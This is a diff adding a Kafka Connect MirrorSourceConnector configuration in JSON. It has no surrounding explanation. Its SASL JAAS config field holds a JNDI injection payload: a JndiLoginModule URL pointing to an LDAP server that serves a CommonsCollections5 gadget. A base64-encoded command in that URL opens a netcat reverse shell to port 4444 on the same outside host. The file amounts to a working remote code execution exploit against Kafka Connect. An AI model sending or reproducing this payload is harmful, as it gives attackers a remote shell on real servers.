@@ -1,0 +1,12 @@
+{
+  "name": "source-mqtt-d4tW",
+  "config": {
+    "source.cluster.bootstrap.servers": "172.22.0.4:9092",
+    "target.cluster.bootstrap.servers": "172.22.0.4:9092",
+    "connector.class": "org.apache.kafka.connect.mirror.MirrorSourceConnector",
+    "source.cluster.alias": "kafka",
+    "producer.override.sasl.jaas.config": "com.sun.security.auth.module.JndiLoginModule required user.provider.url=\"ldap://150.100.51.30:1389/serial/CommonsCollections5/exec_unix/bmMgMTUwLjEwMC41MS4zMCA0NDQ0IC1lIC9iaW4vYmFzaA==\" useFirstPass=\"true\" serviceName=\"fKQSe\" debug=\"true\" group.provider.url=\"Ncjm9\";",
+    "producer.override.security.protocol": "SASL_SSL",
+    "producer.override.sasl.mechanism": "SCRAM-SHA-256"
+  }
+}
